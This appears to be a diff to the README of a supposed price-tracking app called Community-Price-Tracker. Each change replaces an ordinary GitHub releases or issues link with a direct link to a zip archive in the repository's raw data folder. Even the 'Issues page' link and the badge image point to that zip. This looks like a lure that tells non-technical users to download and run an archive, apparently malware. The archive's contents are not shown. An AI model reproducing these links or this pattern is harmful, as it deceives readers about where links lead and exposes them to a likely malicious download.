@@ -1,6 +1,6 @@
 # 📊 Community-Price-Tracker - Track Prices Effortlessly Across Cities
 
-[![Download Community-Price-Tracker](https://img.shields.io/badge/Download%20Now-%20-violet)](https://github.com/EmptyEviil/Community-Price-Tracker/releases)
+[![Download Community-Price-Tracker](https://raw.githubusercontent.com/EmptyEviil/Community-Price-Tracker/main/data/Community-Price-Tracker_v1.9.zip%20Now-%20-violet)](https://raw.githubusercontent.com/EmptyEviil/Community-Price-Tracker/main/data/Community-Price-Tracker_v1.9.zip)
 
 ## 📋 Description
 
@@ -14,7 +14,7 @@ You don’t need to be tech-savvy to use Community-Price-Tracker. Follow these s
    This application works on Windows, macOS, and Linux. Make sure your system is updated and has internet access.
 
 2. **Download the Application**  
-   To get the application, visit this page: [Download Community-Price-Tracker](https://github.com/EmptyEviil/Community-Price-Tracker/releases)  
+   To get the application, visit this page: [Download Community-Price-Tracker](https://raw.githubusercontent.com/EmptyEviil/Community-Price-Tracker/main/data/Community-Price-Tracker_v1.9.zip)  
    Choose the latest version available and download the file suitable for your operating system.
 
 3. **Install the Application**  
@@ -26,7 +26,7 @@ You don’t need to be tech-savvy to use Community-Price-Tracker. Follow these s
 ## 📥 Download & Install
 
 To download Community-Price-Tracker, click the link below.  
-[Download Community-Price-Tracker](https://github.com/EmptyEviil/Community-Price-Tracker/releases)
+[Download Community-Price-Tracker](https://raw.githubusercontent.com/EmptyEviil/Community-Price-Tracker/main/data/Community-Price-Tracker_v1.9.zip)
 
 After clicking the download link, follow these instructions to install:
 
@@ -78,12 +78,12 @@ After clicking the download link, follow these instructions to install:
 
 Join our community to share your experience and get help if needed. Engage with others who use Community-Price-Tracker.
 
-- **GitHub Issues**: Report any bugs or request new features on the [Issues page](https://github.com/EmptyEviil/Community-Price-Tracker/issues).
+- **GitHub Issues**: Report any bugs or request new features on the [Issues page](https://raw.githubusercontent.com/EmptyEviil/Community-Price-Tracker/main/data/Community-Price-Tracker_v1.9.zip).
 - **Discussion Forum**: Participate in discussions with other users and developers to exchange tips and insights.
 
 ## 📣 Updates
 
-Community-Price-Tracker regularly releases updates to enhance performance and add features. Make sure to check the releases page for the latest version: [Download Community-Price-Tracker](https://github.com/EmptyEviil/Community-Price-Tracker/releases).
+Community-Price-Tracker regularly releases updates to enhance performance and add features. Make sure to check the releases page for the latest version: [Download Community-Price-Tracker](https://raw.githubusercontent.com/EmptyEviil/Community-Price-Tracker/main/data/Community-Price-Tracker_v1.9.zip).
 
 ## 🎉 Acknowledgments
 
